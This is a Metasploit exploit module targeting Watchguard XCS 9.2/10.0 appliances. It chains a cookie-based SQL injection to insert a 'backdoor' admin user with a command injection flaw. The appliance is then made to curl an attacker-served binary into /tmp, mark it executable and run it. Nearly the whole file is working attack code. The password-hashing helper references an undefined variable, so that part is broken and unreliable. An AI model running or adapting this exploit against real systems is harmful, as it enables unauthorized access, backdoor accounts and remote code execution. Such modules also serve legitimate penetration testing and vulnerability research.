# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Watchguard XCS Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits two separate vulnerabilities found in the Watchguard XCS virtual
        appliance to gain command execution. By exploiting an unauthenticated SQL injection, a
        remote attacker may insert a valid web user into the appliance database, and get access
        to the web interface. On the other hand, a vulnerability in the web interface allows the
        attacker to inject operating system commands as the &#039;nobody&#039; user.
      },
      &#039;Author&#039;         =>
        [
          &#039;Daniel Jensen <daniel.jensen[at]security-assessment.com>&#039; # discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf&#039;]
        ],
      &#039;Platform&#039;       => &#039;bsd&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;Privileged&#039;     => false,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;Targets&#039;        =>
        [
          [ &#039;Watchguard XCS 9.2/10.0&#039;, { }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 29 2015&#039;
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The target URI&#039;, &#039;/&#039;]),
        OptString.new(&#039;WATCHGUARD_USER&#039;, [true, &#039;Web interface user account to add&#039;, &#039;backdoor&#039;]),
        OptString.new(&#039;WATCHGUARD_PASSWORD&#039;, [true, &#039;Web interface user password&#039;, &#039;backdoor&#039;]),
        OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the payload request&#039;, 10]),
        Opt::RPORT(443)
      ],
      self.class
    )
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/borderpost/imp/compose.php3&#039;),
      &#039;cookie&#039; => "sid=1&#039;"
     })

     if res && res.body && res.body.include?(&#039;unterminated quoted string&#039;)
       return Exploit::CheckCode::Vulnerable
     end

     Exploit::CheckCode::Safe
  end


  def exploit
    # Get a valid session by logging in or exploiting SQLi to add user
    print_status(&#039;Getting a valid session...&#039;)
    @sid = get_session
    print_status(&#039;Successfully logged in&#039;)

    # Check if cmd injection works
    test_cmd_inj = send_cmd_exec(&#039;/ADMIN/mailqueue.spl&#039;, &#039;id&#039;)
    unless test_cmd_inj && test_cmd_inj.body.include?(&#039;uid=65534&#039;)
      fail_with(Failure::UnexpectedReply, &#039;Could not inject command, may not be vulnerable&#039;)
    end

    # We have cmd exec, stand up an HTTP server and deliver the payload
    vprint_status(&#039;Getting ready to drop binary on appliance&#039;)

    @elf_sent = false
    # Generate payload
    @pl = generate_payload_exe

    if @pl.nil?
      fail_with(Failure::BadConfig, &#039;Please select a native bsd payload&#039;)
    end

    # Start the server and use primer to trigger fetching and running of the payload
    begin
      Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
    rescue Timeout::Error
    end
  end

  def attempt_login(username, pwd_clear)
    #Attempts to login with the provided user credentials
    #Get the login page
    get_login_hash = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login.spl&#039;)
    })

    unless get_login_hash && get_login_hash.body
      fail_with(Failure::Unreachable, &#039;Could not get login page.&#039;)
    end

    #Find the hash token needed to login
    login_hash = &#039;&#039;
    get_login_hash.body.each_line do |line|
      next if line !~ /name="hash" value="(.*)"/
      login_hash = $1
      break
    end

    sid_cookie = (get_login_hash.get_cookies || &#039;&#039;).scan(/sid=(\w+);/).flatten[0] || &#039;&#039;
    if login_hash == &#039;&#039; || sid_cookie == &#039;&#039;
      fail_with(Failure::UnexpectedReply, &#039;Could not find login hash or cookie&#039;)
    end

    login_post = {
      &#039;u&#039; => "#{username}",
      &#039;pwd&#039; => "#{pwd_clear}",
      &#039;hash&#039; => login_hash,
      &#039;login&#039; => &#039;Login&#039;
    }
    print_status(&#039;Attempting to login with provided credentials&#039;)
    login = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/login.spl&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;encode_params&#039; => false,
      &#039;cookie&#039; => "sid=#{sid_cookie}",
      &#039;vars_post&#039; => login_post,
      &#039;vars_get&#039; => {
        &#039;f&#039; => &#039;V&#039;
      }
    })


    unless login && login.body && login.body.include?(&#039;<title>Loading...</title>&#039;)
      return nil
    end

    sid_cookie
  end

  def add_user(user_id, username, pwd_hash, pwd_clear)
    #Adds a user to the database using the unauthed SQLi
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/borderpost/imp/compose.php3&#039;),
      &#039;cookie&#039; => "sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES(#{user_id}, &#039;#{username}&#039;, &#039;#{pwd_hash}&#039;, 0, &#039;server_admin&#039;, 0, 0)--"
    })

    unless res && res.body
      fail_with(Failure::Unreachable, "Could not connect to host")
    end

    if res.body.include?(&#039;ERROR:  duplicate key value violates unique constraint&#039;)
      print_status("Added backdoor user, credentials => #{username}:#{pwd_clear}")
    else
      fail_with(Failure::UnexpectedReply, &#039;Unable to add user to database&#039;)
    end

    true
  end

  def generate_device_hash(cleartext_password)
    #Generates the specific hashes needed for the XCS
    post_salt = &#039; some other random (9) stuff&#039;
    final_hash = Rex::Text.md5(cleartext_password + hash_tmp)

    final_hash
  end

  def send_cmd_exec(uri, os_cmd, blocking = true)
    #This is a handler function that makes HTTP calls to exploit the command injection issue
    unless @sid
      fail_with(Failure::Unknown, &#039;Missing a session cookie when attempting to execute command.&#039;)
    end

    opts = {
      &#039;uri&#039; => normalize_uri(target_uri.path, "#{uri}"),
      &#039;cookie&#039; => "sid=#{@sid}",
      &#039;encode_params&#039; => true,
      &#039;vars_get&#039; => {
        &#039;f&#039; => &#039;dnld&#039;,
        &#039;id&#039; => ";#{os_cmd}"
      }
    }

    if blocking
      res = send_request_cgi(opts)
    else
      res = send_request_cgi(opts, 1)
    end

    #Handle cmd exec failures
    if res.nil? && blocking
      fail_with(Failure::Unknown, &#039;Failed to exploit command injection.&#039;)
    end

    res
  end

  def get_session
    #Gets a valid login session, either valid creds or the SQLi vulnerability
    username = datastore[&#039;WATCHGUARD_USER&#039;]
    pwd_clear = datastore[&#039;WATCHGUARD_PASSWORD&#039;]
    user_id = rand(999)

    sid_cookie = attempt_login(username, pwd_clear)

    return sid_cookie unless sid_cookie.nil?

    vprint_error(&#039;Failed to login, attempting to add backdoor user...&#039;)
    pwd_hash = generate_device_hash(pwd_clear)

    unless add_user(user_id, username, pwd_hash, pwd_clear)
      fail_with(Failure::Unknown, &#039;Failed to add user account to database.&#039;)
    end

    sid_cookie = attempt_login(username, pwd_clear)

    unless sid_cookie
      fail_with(Failure::Unknown, &#039;Unable to login with user account.&#039;)
    end

    sid_cookie
  end

  # Make the server download the payload and run it
  def primer
    vprint_status(&#039;Primer hook called, make the server get and run exploit&#039;)

    #Gets the autogenerated uri from the mixin
    payload_uri = get_uri

    filename = rand_text_alpha_lower(8)
    print_status("Sending download request for #{payload_uri}")

    download_cmd = "/usr/local/sbin/curl -k #{payload_uri} -o /tmp/#{filename}"
    vprint_status("Telling appliance to run #{download_cmd}")
    send_cmd_exec(&#039;/ADMIN/mailqueue.spl&#039;, download_cmd)
    register_file_for_cleanup("/tmp/#{filename}")

    chmod_cmd = "chmod +x /tmp/#{filename}"
    vprint_status(&#039;Chmoding the payload...&#039;)
    send_cmd_exec("/ADMIN/mailqueue.spl", chmod_cmd)

    exec_cmd = "/tmp/#{filename}"
    vprint_status(&#039;Running the payload...&#039;)
    send_cmd_exec(&#039;/ADMIN/mailqueue.spl&#039;, exec_cmd, false)

    vprint_status(&#039;Finished primer hook, raising Timeout::Error manually&#039;)
    raise(Timeout::Error)
  end

  #Handle incoming requests from the server
  def on_request_uri(cli, request)
    vprint_status("on_request_uri called: #{request.inspect}")
    print_status(&#039;Sending the payload to the server...&#039;)
    @elf_sent = true
    send_response(cli, @pl)
  end

end

